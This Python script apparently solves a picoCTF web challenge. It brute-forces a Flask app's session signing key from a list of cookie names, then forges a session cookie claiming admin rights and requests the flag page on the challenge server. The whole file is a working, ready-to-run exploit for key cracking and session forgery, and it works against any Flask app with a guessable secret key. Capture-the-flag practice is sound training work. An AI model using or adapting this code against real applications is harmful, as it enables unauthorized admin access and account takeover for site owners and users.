import hashlib
import urllib.request
import re
from flask.json.tag import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer, TimestampSigner, BadSignature

SAMPLE_COOKIE = 'eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Ygj8kA.RbMCD00NKUnNLvm2mxWDpXSwUYs'
COOIE_NAME = ['snickerdoodle', 'chocolate chip', 'oatmeal raisin', 'gingersnap', 'shortbread', 'peanut butter', 'whoopie pie', 'sugar', 'molasses', 'kiss', 'biscotti', 'butter', 'spritz',
              'snowball', 'drop', 'thumbprint', 'pinwheel', 'wafer', 'macaroon', 'fortune', 'crinkle', 'icebox', 'gingerbread', 'tassie', 'lebkuchen', 'macaron', 'black and white', 'white chocolate macadamia']
URL = 'http://mercury.picoctf.net:6259/'
PATTERN = re.compile(r'picoCTF\{[^\}]*\}')


def detect_secret() -> str:
  for secret in COOIE_NAME:
    try:
      URLSafeTimedSerializer(
          secret_key=secret,
          salt='cookie-session',
          serializer=TaggedJSONSerializer(),
          signer=TimestampSigner,
          signer_kwargs={
              'key_derivation': 'hmac',
              'digest_method': hashlib.sha1
          }
      ).loads(SAMPLE_COOKIE)
      return secret
    except BadSignature:
      continue
  return None


def make_admin_session_cookie_value(secret: str) -> str:
  serializer = URLSafeTimedSerializer(
      secret_key=secret,
      salt='cookie-session',
      serializer=TaggedJSONSerializer(),
      signer=TimestampSigner,
      signer_kwargs={
          'key_derivation': 'hmac',
          'digest_method': hashlib.sha1
      }
  )
  return str(serializer.dumps({'very_auth': 'admin'}))


def get_flag(cookie: str) -> None:
  target_url = URL + 'display'
  headers = {'Cookie': 'session='+cookie}
  request = urllib.request.Request(target_url, headers=headers)
  with urllib.request.urlopen(request) as response:
    body = response.read().decode('utf-8')
    print(body)


def main() -> None:
  used_secret = detect_secret()
  cookie_value = make_admin_session_cookie_value(used_secret)
  get_flag(cookie_value)


if __name__ == '__main__':
  main()
